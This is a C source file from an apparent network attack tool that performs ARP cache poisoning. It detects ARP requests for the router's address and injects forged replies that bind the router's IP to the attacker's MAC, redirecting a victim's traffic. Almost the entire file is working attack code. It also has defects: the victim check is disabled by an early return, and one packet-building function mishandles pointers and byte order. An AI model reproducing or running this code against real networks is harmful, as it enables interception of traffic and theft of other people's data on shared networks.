/*
 * =====================================================================================
 *
 *       Filename:  arp_poison.c
 *
 *    Description:  handle the arp spoofing attack
 *
 *        Version:  1.0
 *        Created:  12/22/2014 08:46:28 PM
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  nikkolasg (mn), 
 *        Company:  
 *
 * =====================================================================================
 */
#include <stdlib.h>
#include <stdio.h>
#include "packet_struct.h"
#include <net/if_arp.h>
#include "arp.h"
#include "packet_print.h"
#include <string.h>

extern struct in_addr routerip;
extern struct in_addr victimip;
extern u_char mac[ETH_ADDR_SIZE];

int arp_sent = 0;
int arp_success = 0;

    void
handle_arp (const u_char * packet )
{
    const struct pkt_arp * arp = (const struct pkt_arp *) (packet+ETH_SIZE);
    print_pkt_arp(arp);
    if (ntohs(arp->opcode) == ARPOP_REQUEST ) {
        handle_arp_request(packet);
    } else if (ntohs(arp->opcode) == ARPOP_REPLY) {
        handle_arp_reply(packet);
    }
    return ;
}		/* -----  end of function handle_arp  ----- */

/*
 * handle the arp packet that are of type request.
 * If it finds the ip we want, the attack starts 
 * (if we do not want the attack behavior by default, you
 * can specify it in cmd line options. refer to options.)
 * 
 */
void handle_arp_request(const u_char * packet) {
    const struct pkt_arp * arp = (const struct pkt_arp *) (packet+ETH_SIZE);

    if(is_router_packet(arp) == 0 || is_gratuitous_packet(arp) == 0 || is_broadcast_request(arp) == 0) {
        return;
    }
    if(is_from_victim(arp) == 0) { 
        printf("Will launch an ARP Poison attack with this packet .. !\n");
        arp_poison_pkt(packet);
    } else {
        printf("Packet not from victim. Discard.\n");
    }
}

/**
 * Alternative method to inject ARP response packet */
int arp_poison_pkt(const u_char * pkt) {
   struct pkt_eth * eth;
   struct pkt_arp * arp;
   u_char * bytes = (u_char *) malloc(ARP_PACKET_SIZE);
   u_short spoofed_ip[IP_ADDR_SIZE];
   // cpy of the packet
   memcpy(bytes,pkt,ARP_PACKET_SIZE);
   eth = (struct pkt_eth *) bytes;
   arp = (struct pkt_arp *) (bytes + ETH_SIZE); 
   //print_pkt_eth(eth);
   //print_pkt_arp(arp); 
   
   // cpy of the spooofed ip we gonna use
   memcpy(spoofed_ip,arp->proto_addr_send,IP_ADDR_SIZE);

   // set up eth frame MAC address
   memcpy(eth->src,mac,ETH_ADDR_SIZE);
   memcpy(eth->dest,arp->hard_addr_send,ETH_ADDR_SIZE);
    // set up opcode
   arp->opcode = htons(ARPOP_REPLY);
   // set up MAC
   memcpy(arp->hard_addr_dest,arp->hard_addr_send,ETH_ADDR_SIZE);
   memcpy(arp->hard_addr_send,mac,ETH_ADDR_SIZE);
   // set up IP
   memcpy(arp->proto_addr_send,arp->proto_addr_dest,IP_ADDR_SIZE);
   memcpy(arp->proto_addr_dest,spoofed_ip,IP_ADDR_SIZE);

   //print_pkt_arp(arp); 
   try_send_packet(bytes);

   free(bytes);

}
    int
arp_poison (const u_char * p )
{
    const struct pkt_arp * packet = (const struct pkt_arp *) p + ETH_SIZE;
    u_char  bytes[ARP_PACKET_SIZE];
    int offset = 0;
    //cpy dest mac address
    memcpy(bytes,packet->hard_addr_send,ETH_ADDR_SIZE);
    offset += ETH_ADDR_SIZE;
    //cpy src mac address i.e. OWN mac address
    memcpy(bytes+offset,mac,ETH_ADDR_SIZE);
    offset += ETH_ADDR_SIZE;
    //cpy type of packet
    bytes[offset] = htons(ETHERTYPE_ARP);
    offset += 2;
    //ARP structure
    //cpy in one pass htype,ptype,hard_len,proto_len
    //memcpy(bytes+offset,packet,6);
    //offset += 6;
    bytes[offset++] = htons(packet->htype) & 0xff;
    bytes[offset++] = (htons(packet->ptype) >> 8) & 0xff;
    bytes[offset++] = htons(packet->hard_addr_len) & 0xff;
    bytes[offset++] = (htons(packet->proto_addr_len) << 8) & 0xff;

    // code reply
    bytes[offset]  = htons(ARPOP_REPLY);
    offset += 2;

    // SRC eth addr i.e. OWN mac
    memcpy(bytes+offset,mac,ETH_ADDR_SIZE);
    offset += ETH_ADDR_SIZE;
    // SRC ip addr, i.e. router ;)
    memcpy(bytes+offset,packet->proto_addr_dest,IP_ADDR_SIZE);
    offset += IP_ADDR_SIZE;
    // DEST eth addr, i.e. victim
    memcpy(bytes+offset,packet->hard_addr_send,ETH_ADDR_SIZE);
    offset += ETH_ADDR_SIZE;
    // DEST ip addr, i.e. victim
    memcpy(bytes+offset,packet->proto_addr_send,IP_ADDR_SIZE);

    try_send_packet(bytes);
        return 0;
}		/* -----  end of function arp_poison  ----- */

/**
 * Try to inject the packet
 * update varisous stats
 * */
void try_send_packet(const u_char * bytes) {
    int offset = 0;
    pkt_eth * eth = (struct pkt_eth *) bytes;
    pkt_arp * arp = (struct pkt_arp *) (bytes + ETH_SIZE); 
    for(offset=0;offset < 60;offset++) printf("x"); 
    printf("\n");
    print_pkt_eth(eth);
    print_pkt_arp(arp);  
    if ( 0 == send_packet(bytes,ARP_PACKET_SIZE)) {
        arp_success++;
    }
    arp_sent++;
    for(offset=0;offset<60;offset++) printf("x");
        
    printf("\nSuccess : %d\tSent : %d\n",arp_success,arp_sent);

}
void handle_arp_reply(const u_char * bytes) {
    printf("Nothing to be done with ARP replies.\n");
return;
}

int is_from_victim(const struct pkt_arp * packet) {
    return 0;
    const struct in_addr * addr = (const struct in_addr *) packet->proto_addr_send;
    if ( addr->s_addr != victimip.s_addr) return -1;
    return 0;
}

/**
 * Will detect if one of the address in the packet is the router.
 * If so returns 0, we generally dont want to mess with the router
 * for now =)
 * */
int is_router_packet(const struct pkt_arp * packet) {
    const struct in_addr * addr;
    addr = (const struct in_addr*)packet->proto_addr_dest;
    if (addr->s_addr  !=  routerip.s_addr)  {
        printf("ARP request : destination is NOT router. No attacks.\
                We could however,but for what !?\n");
        return 0;
    }
    addr = (const struct in_addr*)packet->proto_addr_send;
    if(addr->s_addr == routerip.s_addr) {
        printf("ARP request : source is router. No attacks.\n");
        return 0;
    }

    return -1;

}

/*
 * Will detect if this packet is a gratuitous one (just one sending its info to others to update arp table
 * without any requests)
 * return 0 if true
 */
int is_gratuitous_packet(const struct pkt_arp * packet) {
    const struct in_addr * src = (const struct in_addr*) packet->proto_addr_dest;
    const struct in_addr * dest = (const struct in_addr*) packet->proto_addr_send;
    if( src->s_addr == dest->s_addr ) {
        printf("ARP request : Gratuitous packet detected. No attacks.\n");
        return 0;
    }
    return 1;
}

/**
 * Return 0 if the request is being done on a broadcast address
 * */
int is_broadcast_request(const struct pkt_arp * packet) {
    return 1;
}
